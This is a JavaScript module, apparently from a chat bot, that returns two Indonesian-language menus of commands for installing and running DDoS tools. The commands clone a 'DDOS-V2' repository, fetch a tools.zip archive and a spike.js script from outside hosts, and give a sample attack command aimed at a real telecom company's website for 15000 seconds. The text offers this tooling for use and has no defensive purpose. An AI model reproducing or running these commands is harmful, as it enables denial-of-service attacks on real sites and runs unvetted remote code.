exports.tools1 = (prefix) => {
return `*_pkg update && pkg upgrade
apt-get update && apt-get upgrade
pkg install python && pkg install python2 && pkg install python3
pkg install git
pkg install golang
pkg install npm
pkg install nodejs
pkg install openjdk-17
pkg install python-pip
pkg install python3-pip
pip install requests
pip install --upgrade pip
git clone https://github.com/teamcyber-glitch/DDOS-V2
cd DDOS-V2
python3 setup.py
(KALO DISURUR MASUKIN PW MASUKIN INI PW : 0000)
ls
pip install -r requirements.txt
cd resources
bash install.sh
ulimit -n 999999
chmod 777 *
ls
cd
cd DDOS-V2
python3 main.py
USERNAME : cyber
PASSWORD : op
special_*`
}

exports.tools2 = (prefix) => {
return `*_apt update
apt upgrade (install nanti y)
apt install nodejs (install nanti y)
apt install golang-go (install nanti y)
apt install unzip (install nanti y kalau tidak ada lanjutkan ke cmd selanjutnya)
apt install default-jdk (install nanti y)
apt install npm (install nanti y)
npm i fs
npm i url
npm i net
npm i cluster
npm i events
wget https://emmaciceri.com/tools.zip
unzip tools.zip
rm -r tools.zip
cd tools
wget https://cdn.discordapp.com/attachments/1134444534877667421/1150599984790634556/spike.js
chmod +x tls
ls
cd tools
java dandier.java
(CONTOH ATTACK 1)
java dandier.java https://www.axis.co.id 15000_*`
}